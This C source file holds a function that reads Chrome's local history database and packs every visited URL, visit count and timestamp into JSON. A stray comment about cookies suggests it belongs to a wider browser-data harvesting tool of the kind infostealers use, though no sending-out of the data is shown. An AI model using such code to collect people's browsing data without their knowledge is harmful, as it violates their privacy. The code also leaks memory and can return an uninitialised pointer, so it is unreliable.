#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <cJSON/cJSON.h>
#include <sqlite3.h>
#include <time.h>
#include "Chrome.h"
char* GetChromeSavedHistory(){
	char chromeHistoryPath[MAX_PATH_LENGTH];
	CHROME_PATH_HISTORY(chromeHistoryPath);
	char *json_string;


	sqlite3* conn = getDBConnection(chromeHistoryPath);
	if (conn != NULL) {
		sqlite3_stmt *stmt;
		const char *query = "SELECT url, title, visit_count, last_visit_time FROM urls";
		if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
			int result;
			// Create a cJSON array
    		cJSON *json_array = cJSON_CreateArray();
    		int i = 1;
			while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
				
				char* url = strdup((char*)sqlite3_column_text(stmt, 0));
				char* title = strdup((char*)sqlite3_column_text(stmt, 1));
				int visitCount = sqlite3_column_int(stmt, 2);
				time_t LastVisitTime = (time_t)sqlite3_column_int64(stmt, 3);
				if(strcmp(url, "") && strcmp(title, "") ){
					// Create a cJSON object for an entry
					cJSON *entry = cJSON_CreateObject();
					// Add id, host_key, name, path, cookies and expires_utc  to the entry
					cJSON_AddNumberToObject(entry, "id", i);
					cJSON_AddStringToObject(entry, "url", url);
					cJSON_AddNumberToObject(entry, "visitCount", visitCount);
					cJSON_AddNumberToObject(entry, "LastVisitTime", LastVisitTime);
					

					// Add the entry to the array
					cJSON_AddItemToArray(json_array, entry);
					i++;
				}	
			}
			
			json_string = cJSON_Print(json_array);
			cJSON_Delete(json_array);
			sqlite3_finalize(stmt);

		} else {
			fprintf(stderr, "Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
		}
	}
	remove("temp.db");
	return json_string;
}